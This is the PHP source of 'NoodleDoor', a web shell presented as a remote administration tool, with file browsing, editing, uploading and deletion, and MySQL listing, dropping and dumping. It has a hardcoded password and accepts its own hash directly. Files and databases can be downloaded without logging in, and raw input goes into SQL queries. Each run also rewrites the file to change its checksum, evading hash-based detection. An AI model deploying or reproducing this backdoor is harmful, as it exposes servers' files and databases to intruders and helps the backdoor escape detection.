<?php

################################################################################
#Configuration
################################################################################
$pass = hash("sha256", "cake");
$sqlinfo = [
  "host" => "",
  "username" => "",
  "password" => ""
];

date_default_timezone_set('America/Denver');

################################################################################
#Handling loads
################################################################################
if (isset($_POST["directive"]))
  $_GET[$_POST["directive"]] = "";

################################################################################
#Functions
################################################################################
function endsWith($a,$b){$c=strlen($b);$d=$c*-1;return(substr($a,$d)===$b);}
function startsWith($a,$b){$c=strlen($b);return(substr($a,0,$c)===$b);}
function emptyDir($a){if(is_dir($a)){$b=scandir($a);foreach($b as $c){if($c!="."&&$c!=".."){if(is_dir($a."/".$c))emptyDir($a."/".$c);else unlink($a."/".$c);}}reset($b);rmdir($a);}}
function dirsize($a){$b=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($a));$c = 0;foreach($b as $d){$c+=$d->getSize();}return $c;}
function getsize($a,$b=2){if(is_file($a)){$a=filesize($a);}elseif(is_dir($a)){$a=dirsize($a);}return$a;}
function hsize($a,$b=2){$a=getsize($a);$c=array('b','kb','mb','gb','tb','pb','eb','zb','yb');$d=floor((strlen($a)-1)/3);return sprintf("%.{$b}f",$a/pow(1024,$d)).@$c[$d];}
function hperms($a){$b=fileperms($a);if(($b&0xC000)==0xC000){$c='s';}elseif(($b&0xA000)==0xA000){$c='l';}elseif(($b&0x8000)==0x8000){$c='-';}elseif(($b&0x6000)==0x6000){$c='b';}elseif(($b&0x4000)==0x4000){$c='d';}elseif(($b&0x2000)==0x2000){$c='c';}elseif(($b&0x1000)==0x1000){$c='p';}else{$c='u';}$c.=(($b&0x0100)?'r':'-');$c.=(($b&0x0080)?'w':'-');$c.=(($b&0x0040)?(($b&0x0800)?'s':'x'):(($b&0x0800)?'S':'-'));$c.=(($b&0x0020)?'r':'-');$c.=(($b&0x0010)?'w':'-');$c.=(($b&0x0008)?(($b&0x0400)?'s':'x'):(($b&0x0400)?'S':'-'));$c.=(($b&0x0004)?'r':'-');$c.=(($b&0x0002)?'w':'-');$c.=(($b&0x0001)?(($b&0x0200)?'t':'x'):(($b&0x0200)?'T':'-'));return $c;}
function hpath(){global $pass;global $path;$a=array_filter(explode("/",$path));$b="";$c="";foreach($a as $d){$b.="/".$d;$c.="<li><a p='$pass' dir='$b' class='a'>$d</a></li>";}return "<ol class='breadcrumb'>$c<a href='?dl=$path' target='_blank' class='btn btn-xs btn-default pull-right'><i class='glyphicon glyphicon-download' aria-hidden='true'></i> Download Folder</a><form id='file' action='' method='post' enctype='multipart/form-data' class='form form-inline pull-right'><input type='hidden' name='action' value='upload'><input type='hidden' name='p' value='$pass'><input type='hidden' name='dir' value='$path'><span class='btn btn-xs btn-default btn-file'><i class='glyphicon glyphicon-upload' aria-hidden='true'></i> Upload File<input type='file' name='file'></span><input type='submit' style='display:none;'></form><button type='button' class='btn btn-default btn-xs pull-right' data-toggle='modal' data-target='#modNew'><i class='glyphicon glyphicon-plus'></i> Create File</button></ol><div class='modal fade' id='modNew' tabindex='-1' role='dialog' aria-labelledby='myModalLabel' aria-hidden='true'><div class='modal-dialog'><div class='modal-content'><div class='modal-header'><button type='button' class='close' data-dismiss='modal'><span aria-hidden='true'>&times;</span><span class='sr-only'>Close</span></button><h4 class='modal-title' id='myModalLabel'>Create a new File</h4></div><form action='' method='post' class='form'><div class='modal-body'><div class='form-group'><label for='newname'>Name of File</label><input type='text' id='newname' class='form-control' name='target'></div><input type='hidden' name='p' value='$pass'><input type='hidden' name='dir' value='$path'><input type='hidden' name='action' value='create'></div><div class='modal-footer'><button type='button' class='btn btn-default' data-dismiss='modal'>Close</button><input type='submit' value='Create' class='btn btn-default'></div></form></div></div></div>";}
function relPath($a,$b=__FILE__){if($a == $b){return "./";}$b=is_dir($b)?rtrim($b,'\/').'/':$b;$a=is_dir($a)?rtrim($a,'\/').'/':$a;$b=str_replace('\\','/',$b);$a=str_replace('\\','/',$a);$b=explode('/',$b);$a=explode('/',$a);$c=$a;foreach($b as $d=>$e){if($e===$a[$d]){array_shift($c);}else{$f=count($b)-$d;if($f>1){$g=(count($c)+$f-1)*-1;$c=array_pad($c,$g,'..');break;}else{$c[0]='./'.$c[0];}}}return implode('/',$c);}
function _download($a,$b){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Length: '.getsize($a));header('Content-Disposition: attachment; filename='.basename($b));readfile(str_replace("/","",$a));}
function dlDir($d){try {$j=md5(str_replace("/", "", $d)) . ".tar";$a=new PharData($j);$a->buildFromDirectory(relPath($d));}catch(Exception $e){echo $e;}_download($j, $j);unlink($j);}
function dlFile($d){try {$j=md5(str_replace("/", "", $d)) . ".tar";$a=new PharData($j);$a->addFile(relPath($d));}catch(Exception $e){echo $e;}_download($j, $j);unlink($j);}
Class DBBackup{private $a;private $b;private $c;private $d;private $f;private $g;private $h=array();private $j;private $k=array();private $l;private $m;public function DBBackup($n){if(!$n['host'])$this->error[]='Parameter host missing';if(!$n['user'])$this->error[]='Parameter user missing';if(!isset($n['password']))$this->error[]='Parameter password missing';if(!$n['database'])$this->error[]='Parameter database missing';if(!$n['driver'])$this->error[]='Parameter driver missing';if(count($this->error)>0){return;}$this->host=$n['host'];$this->driver=$n['driver'];$this->user=$n['user'];$this->password=$n['password'];$this->dbName=$n['database'];$this->fileName=$this->dbName."-".time().".sql";$this->writeFile('CREATE DATABASE '.$this->dbName.";\n\n");if($this->host=='localhost'){$this->host='127.0.0.1';}$this->dsn=$this->driver.':host='.$this->host.';dbname='.$this->dbName;$this->connect();$this->getTables();$this->writeFile("-- THE END\n\n");_download($this->fileName, $this->fileName);unlink($this->fileName);}public function writeFile($p){file_put_contents($this->fileName,(is_file($this->fileName)==false?"":file_get_contents($this->fileName)).$p);}public function backup(){if(count($this->error)>0){return array('error'=>true,'msg'=>$this->error);}return array('error'=>false,'msg'=>$this->final);}private function generate($r){$this->final.='--CREATING TABLE '.$r['name']."\n";$this->final.=$r['create'].";\n\n";$this->final.='--INSERTING DATA INTO '.$r['name']."\n";$this->final.=$r['data']."\n\n\n";$this->writeFile($this->final);$this->final="";}private function connect(){try{$this->handler=new PDO($this->dsn,$this->user,$this->password);}catch(PDOException $s){$this->handler=null;$this->error[]=$s->getMessage();return false;}}private function getTables(){try{$t=$this->handler->query('SHOW TABLES');$u=$t->fetchAll();$v=0;foreach($u as $w){$x['name']=$w[0];$x['create']=$this->getColumns($w[0]);$x['data']=$this->getData($w[0]);$this->generate($x);$v++;}unset($t);unset($u);unset($v);return true;}catch(PDOException $s){$this->handler=null;$this->error[]=$s->getMessage();return false;}}private function getColumns($y){try{$t=$this->handler->query('SHOW CREATE TABLE '.$y);$z=$t->fetchAll();$z[0][1]=preg_replace("/AUTO_INCREMENT=[\w]*./",'',$z[0][1]);return $z[0][1];}catch(PDOException $s){$this->handler=null;$this->error[]=$s->getMessage();return false;}}private function getData($y){try{$t=$this->handler->query('SELECT * FROM '.$y);$z=$t->fetchAll(PDO::FETCH_NUM);$aa='';foreach($z as $bb){foreach($bb as&$cc){$cc=htmlentities(addslashes($cc));}$aa.='INSERT INTO '.$y.' VALUES (\''.implode('\',\'',$bb).'\');'."\n";}return $aa;}catch(PDOException $s){$this->handler=null;$this->error[]=$s->getMessage();return false;}}}
function dlDB($h,$u,$p,$d){$b=new DBBackup(array('host'=>$h,'driver'=>'mysql','user'=>$u,'password'=>$p,'database'=>$d));}

################################################################################
#Downloading files
################################################################################
if (isset($_GET["dl"])) {
  if (is_file($_GET["dl"])) {
    dlFile($_GET["dl"]);
  } elseif (is_dir($_GET["dl"])) {
    dlDir($_GET["dl"]);
  }
  exit;
}

################################################################################
#Downloading databases
################################################################################
if (isset($_GET["d"]) && isset($_GET["h"]) && isset($_GET["u"]) && isset($_GET["p"])) {
  dlDB($_GET["h"],$_GET["u"],$_GET["p"],$_GET["d"]);
  exit;
}

################################################################################
#Views
################################################################################
#If they are logged in
if (hash("sha256", $_POST['p']) == $pass || $_POST['p'] == $pass) {
  #Get the name of the file
  $nof = explode("/", __FILE__)[count(explode("/", __FILE__))-1];
  #Get path to the file
  $path = isset($_POST['dir']) ? $_POST['dir'] : __FILE__;
  #Normalize path
  $path = endsWith($path, $nof) && strlen($path) == strlen(__FILE__) ? substr($path, 0, (-1 * strlen($nof))) : $path;
  $path = startsWith($path, "/") ? $path : "/" . $path;
  $path = endsWith($path, "/") ? $path : $path . "/";
  $path = endsWith($path, "../") ? substr($path, 0, (-1 * (strlen(explode("/", $path)[count(explode("/", $path))-3]) + 4))) : $path;
  $bod = "";
  

################################################################################
#Command-line
################################################################################
  if (isset($_GET["c"])) {
    $section = "c";
    $bod .= "";

################################################################################
#MySQL
################################################################################
  } elseif (isset($_GET["d"])) {
    $section = "d";

    if (isset($_POST["d-p"])) {
      try {
        $db = new PDO("mysql:host=".$_POST["d-h"].";charset=utf8", $_POST["d-u"], $_POST["d-p"]);
      } catch (PDOException $e) {
        $err = "<div class='alert alert-danger'>ERROR: " . $e->getMessage() . "</div>";
      }
    } else {
      $db = null;
      $err = "";
    }
    
    #Logging into MySQL
    if ($db == null) {
      $bod .= "
      <div class='col-xs-offset-0 col-xs-12 col-md-offset-4 col-md-4'>
        <form class='form' role='form' method='post'>
          ".$err."
          <input type='hidden' name='p' value='$pass'>
          <input type='hidden' name='action' value='login'>
          <input type='hidden' name='target' value='databases'>
          <div class='form-group'>
            <label for='h'>SQL Host</label>
            <input type='text' class='form-control' id='h' name='d-h' placeholder='Host' value='".$sqlinfo["host"]."'>
          </div>
          <div class='form-group'>
            <label for='u'>SQL Username</label>
            <input type='text' class='form-control' id='u' name='d-u' placeholder='Username' value='".$sqlinfo["username"]."'>
          </div>
          <div class='form-group'>
            <label for='p'>SQL Password</label>
            <input type='password' class='form-control' id='p' name='d-p' placeholder='Password' value='".$sqlinfo["password"]."'>
          </div>
          <button type='submit' class='btn btn-default btn-block'>Sign in</button>
        </form>
      </div>";
    #List databases
    } elseif (is_object($db) && $err == null && $_POST["target"] == "databases") {
      $bod .= "<table class='col-xs-12 table table-bordered table-condensed table-responsive table-striped'><tr><th>Database</th><th>Collation</th><th>Tables</th><th></th></tr>";
      $stmt = $db->query("show databases");
      foreach ($db->query("SHOW GRANTS FOR CURRENT_USER()") as $t) {
        $p = $t[0];
        $p = explode("GRANT ", $p)[1];
        $p = explode(" TO", $p)[0];
        $p = explode(" ON ", $p);
        #echo $p[0], $p[1];
        #echo "<Br><br>";
      }
      foreach($stmt as $row) {
        $rows = 0;
        $rowsq = $db->query("select count(*) from `information_schema`.tables where table_schema='$row[Database]'");
        foreach($rowsq as $r) {
          $rows = intval($r[0]);
        }
        $col = "";
        $colq = $db->query("SELECT CCSA.character_set_name FROM information_schema.`TABLES` T,
          information_schema.`COLLATION_CHARACTER_SET_APPLICABILITY` CCSA
          WHERE CCSA.collation_name = T.table_collation
          AND T.table_schema = '$row[Database]'");
        foreach($colq as $c) {
          $col = $c[0];
        }
        $dl = "<a href='?d=$row[Database]&h=".$_POST["d-h"]."&u=".$_POST["d-u"]."&p=". $_POST["d-p"]."' target='_blank' class='btn btn-xs btn-primary'><i class='glyphicon glyphicon-download-alt' aria-hidden='true'></i></a>";
        $delete = "<a target='database' dir='".$row["Database"]."' action='drop' class='a btn btn-xs btn-danger'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i></a>";
        $bod .= "<tr><td><a class='a' target='database' dir='".$row["Database"]."' action='view'><i class='glyphicon glyphicon-briefcase'></i> ".$row["Database"]."</a></td><td>".$col."</td><td>$rows</td><td>$delete $dl</td></tr>";
      }
    #List tables in database
    } elseif (is_object($db) && $err == null && $_POST["target"] == "database") {
      $bod .= "<table class='col-xs-12 table table-bordered table-condensed table-responsive table-striped'><tr><th>Table</th><th>Rows</th><th>Columns</th><th></th></tr>";
      $stmt = $db->query("select `TABLE_NAME`, `CREATE_TIME`, `UPDATE_TIME` from `information_schema`.tables where table_schema='$_POST[dir]'");
      foreach ($db->query("SHOW GRANTS FOR CURRENT_USER()") as $t) {
        $p = $t[0];
        $p = explode("GRANT ", $p)[1];
        $p = explode(" TO", $p)[0];
        $p = explode(" ON ", $p);
        #echo $p[0], $p[1];
        #echo "<Br><br>";
      }
      foreach($stmt as $row) {
        $cols = 0;
        $colsq = $db->query("select count(*) from `information_schema`.`COLUMNS` where table_schema='$_POST[dir]' and table_name='$row[TABLE_NAME]'");
        foreach($colsq as $r) {
          $cols = intval($r[0]);
        }
        $rowsq = $db->query("select * from `$_POST[dir]`.`$row[TABLE_NAME]`");
        $rows = $rowsq->rowCount();
        $dl = "<a href='?d=$row[Database]&h=".$_POST["d-h"]."&u=".$_POST["d-u"]."&p=". $_POST["d-p"]."' target='_blank' class='btn btn-xs btn-primary'><i class='glyphicon glyphicon-download-alt' aria-hidden='true'></i></a>";
        $delete = "<a target='table' dir='$row[TABLE_NAME]' action='drop' class='a btn btn-xs btn-danger'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i></a>";
        $bod .= "<tr><td><a class='a' target='table' dir='$row[table_name]' action='view'><i class='glyphicon glyphicon-align-justify'></i> $row[TABLE_NAME]</a></td><td>".$rows."</td><td>$cols</td><td>$delete $dl</td></tr>";
      }
    }
################################################################################
#Files
################################################################################
  } else {
    $section = "f";

    $bod .= hpath();
    $action = isset($_POST["action"]) ? ($_POST["action"] == "browse" ? "browse" : ($_POST["action"] == "edit" ? "edit" : ($_POST["action"] == "delete" ? "delete" : ($_POST["action"] == "edit" ? "edit" : ($_POST["action"] == "rename" ? "rename" : ($_POST["action"] == "upload" ? "upload" : ($_POST["action"] == "create" ? "create" : "browse"))))))) : "browse";
    if ($action == "delete") {
      if ($_POST["target"] != __FILE__ && !startsWith(__FILE__, $_POST["target"])) {
        if (is_file($_POST["target"])) {
          unlink($_POST["target"]);
        } elseif (is_dir($_POST["target"])) {
          emptyDir($_POST["target"]);
        }
      }
      $action = "browse";
    } elseif ($action == "create") {
      if (!is_file($_POST["target"])) {
        file_put_contents($_POST["dir"].$_POST["target"], "");
      }
      $action = "browse";
    } elseif ($action == "rename") {
      if ($_POST["target"] != __FILE__ && !startsWith(__FILE__, $_POST["target"])) {
        rename($_POST["target"], $_POST["dir"].$_POST["change"]);
        $action = "browse";
      }
      $action = "browse";
    } elseif ($action == "upload") {
      $target_file = $path . basename($_FILES["file"]["name"]);
      $uploadOk = 1;
      $uploadOk = 1;
      if (file_exists($target_file)) {
        echo "File already exists.";
        $uploadOk = 0;
      }
      if ($uploadOk == 0) {
        echo "Your file was not uploaded.";
      } else {
        if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
          
        } else {
          echo "There was an error uploading your file.";
        }
      }
      $action = "browse";
    } elseif ($action == "edit" && strlen($_POST['new']) < 4) {
      $file = explode("/", $_POST["target"])[count(explode("/", $_POST["target"]))-1];
      $bod .= "Editing <strong>$file</strong><br><br><form method='post' action=''><input type='hidden' name='p' value='$pass'><input type='hidden' name='dir' value='$path'><input type='hidden' name='action' value='edit'><input type='hidden' name='target' value='$_POST[target]'><textarea name='new' style='width:95%' rows='20'>" . htmlentities(file_get_contents($_POST["target"])) . "</textarea><br><input type='submit' value='Save' class='btn btn-primary'></form>";
    } elseif ($action == "edit" && strlen($_POST['new']) > 4) {
      $file = explode("/", $_POST["target"])[count(explode("/", $_POST["target"]))-1];
      file_put_contents($_POST["target"], $_POST['new']);
      $bod .= "Editing <strong>$file</strong><br><br>File saved!<br><form method='post' action=''><input type='hidden' name='p' value='$pass'><input type='hidden' name='dir' value='$path'><input type='hidden' name='action' value='edit'><input type='hidden' name='target' value='$_POST[target]'><textarea name='new' style='width:95%' rows='20'>" . htmlentities(file_get_contents($_POST["target"])) . "</textarea><br><input type='submit' value='Save' class='btn btn-primary'></form>";
    }
    if ($action == "browse") {
      $dir = scandir($path);
      $bod .= "<table class='col-xs-12 table table-bordered table-condensed table-responsive table-striped'><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Owner</th><th>Date Modified</th><th></th></tr>";
      $dirs = "";
      $files = "";
      foreach ($dir as $file) {
        $sfile = preg_replace("/[^a-zA-Z0-9]+/", "", $file);
        if ($file == ".") { continue; }
        if (is_dir($path . $file)) {
          $stats = [];
          $stats["name"] = "<a p='$pass' dir='$path$file' class='a'><i class='glyphicon glyphicon-folder-open'></i>&nbsp; $file</a>";
          $stats["perms"] = "";
          $stats["owner"] = "";
          $stats["size"] = $file != ".." ? hsize($path . $file) : "";
          $chsums = "";
          $delete = "<a dir='$path' action='delete' target='$path$file' class='btn btn-xs btn-danger'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i></a>";
          $isdir = true;
        } elseif (is_file($path . $file)) {
          $stats = stat($path . $file);
          $stats["name"] = $file != $nof ? "<a p='$pass' dir='$path' action='edit' target='$path$file' class='a'><i class='glyphicon glyphicon-file'></i> $file</a>" : "<abbr title='For stability purposes you cannot edit this file'><i class='glyphicon glyphicon-file'></i> $file</abbr>";
          $stats["perms"] = hperms($path . $file);
          $stats["owner"] = posix_getpwuid(fileowner($path . $file))["name"];
          $stats["size"] = hsize($path . $file);
          $hashes = "";
          foreach (hash_algos() as $v) {
            $r = getsize($path . $file) < 1980000000 ? hash_file($v, $path . $file) : "<a href='http://php.net/manual/en/function.hash-file.php#103656'>file too large</a>";
            $stats["hashes"][$v] = $r; 
            $sr = strlen($r) > 55 ? substr($r, 0, 52) . "..." : $r;
            $hashes .= "<tr><td>$v</td><td><span title='$r'>$sr</span></td></tr>";
          }
          $chsums = "<button type='button' class='btn btn-default btn-xs' data-toggle='modal' data-target='#mod$sfile'><i class='glyphicon glyphicon-lock'></i></button><div class='modal fade' id='mod$sfile' tabindex='-1' role='dialog' aria-labelledby='myModalLabel' aria-hidden='true'><div class='modal-dialog'><div class='modal-content'><div class='modal-header'><button type='button' class='close' data-dismiss='modal'><span aria-hidden='true'>&times;</span><span class='sr-only'>Close</span></button><h4 class='modal-title' id='myModalLabel'>$file Checksums</h4></div><div class='modal-body'><table class='table table-responsive table-striped table-bordered hashes'>".$hashes."</table></div><div class='modal-footer'><button type='button' class='btn btn-default' data-dismiss='modal'>Close</button></div></div></div></div>";
          $delete = "<a dir='$path' action='delete' target='$path$file' class='btn btn-xs btn-danger a'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i></a>";
          $isdir = false;
        }
        $stats["name"] = $file != ".." && $file != $nof ? "<button type='button' onClick='$(\"#s$sfile\").toggle();$(\"#f$sfile\").toggle();' class='btn btn-default btn-xs pull-right'><i class='glyphicon glyphicon-pencil'></i></button><span id='s$sfile'>" . $stats["name"] . "</span><form id='f$sfile' action='' method='post' style='display:none' class='form form-inline'><input type='text' name='change' value='$file' class='form-control input-sm'><input type='hidden' name='p' value='$pass'><input type='hidden' name='target' value='$path$file'><input type='hidden' name='action' value='rename'><input type='hidden' name='dir' value='$path'><input type='submit' style='display:none'></form>" : $stats["name"];
        $stats["date"] = date("Y-m-d, g:ma", filectime($path . $file));
        $download = "<a href='?dl=$path$file' target='_blank' class='btn btn-xs btn-primary'><i class='glyphicon glyphicon-download-alt' aria-hidden='true'></i></a>";
        $echo = "<tr>
          <td>$stats[name]</td>
          <td>$stats[size]</td>
          <td>$stats[perms]</td>
          <td>$stats[owner]</td>
          <td>$stats[date]</td>
          <td>$delete $download $chsums</td>
        </tr>";
        if ($isdir) {
        $dirs .= $echo;
        } else {
        $files .= $echo;
        }
      }
      $bod .= $dirs;
      $bod .= $files;
    }
  }
} else {
  $bod .= "
  <div class='col-xs-offset-0 col-xs-12 col-md-offset-4 col-md-4'>
    <form class='form-inline' role='form' method='post'>
      <div class='form-group'>
        <label class='sr-only' for='p'>Password</label>
        <input type='password' class='form-control' id='p' name='p' placeholder='Password'>
      </div>
      <button type='submit' class='btn btn-default'>Sign in</button>
    </form>
  </div>";
}

$rtext = hash("sha512", substr(str_shuffle(str_repeat("!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~",rand(15,50))),1,rand(256,4096)));
file_put_contents(__FILE__, file_get_contents(__FILE__) . "\n<!--$rtext-->");
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="A program for remote viewing the filesystem, database, and using the command line for system administrators away from home">
    <meta name="author" content="Zbee (Ethan Henderson)">

    <title>NoodleDoor</title>

    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">
    <style>
    a { cursor:pointer; }
    body { margin-top: 75px; }
    .hashes { max-width: 300px !important; }
    .btn-file {
        position: relative;
        overflow: hidden;
      }
      .btn-file input[type=file] {
        position: absolute;
        top: 0;
        right: 0;
        min-width: 100%;
        min-height: 100%;
        font-size: 100px;
        text-align: right;
        filter: alpha(opacity=0);
        opacity: 0;
        outline: none;
        background: white;
        cursor: inherit;
        display: block;
      }
    </style>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>

  <body id="bod">

    <div class="modal fade" tabindex="-1" role="dialog" id="debug">
      <div class="modal-dialog">
        <div class="modal-content">
          <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
            <h4 class="modal-title">Debug</h4>
          </div>
          <div class="modal-body">
            <pre><?php var_dump($_POST); ?></pre>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
          </div>
        </div><!-- /.modal-content -->
      </div><!-- /.modal-dialog -->
    </div><!-- /.modal -->

    <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
      <div class="container container-fluid">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="<?=$nof?>">NoodleDoor</a>
        </div>
        <div id="navbar" class="collapse navbar-collapse">
          <ul class="nav navbar-nav">
            <li <?php if (!isset($_GET["c"]) && !isset($_GET["d"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>">File System</a></li>
            <li <?php if (isset($_GET["c"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>?c">Command Line</a></li>
            <li <?php if (isset($_GET["d"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>?d">Database</a></li>
          </ul>
          <ul class="nav navbar-nav navbar-right">
            <li><a data-toggle="modal" data-target="#debug">Debug</a></li>
            <li><a href="https://github.com/Zbee" target="_blank">Made by Zbee</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav>

    <div class="container">
    <?=$bod?>
    </div><!-- /.container -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" defer></script>
    <script>
    $(".a").click(function () {
      $(".container").remove();
      $("body").load(
        "./<?=$nof?>",
        {
          p: "<?=$pass?>",
          directive: "<?=$section?>",
          dir: $(this).attr("dir"),
          action: $(this).attr("action"),
          target: $(this).attr("target")
          <?php
            if ($section == "d")
              echo ", 'd-p': '".$_POST["d-p"]."'"
                . ", 'd-h': '".$_POST["d-h"]."'"
                . ", 'd-u': '".$_POST["d-u"]."'";
          ?>
        }
      );
    });
    $(".breadcrumb li:first-child").html($(".breadcrumb li:first-child a").html()).addClass("active");
    $("input:file").change(function (){
      $("#file").submit();
    });
    </script>
  </body>
</html>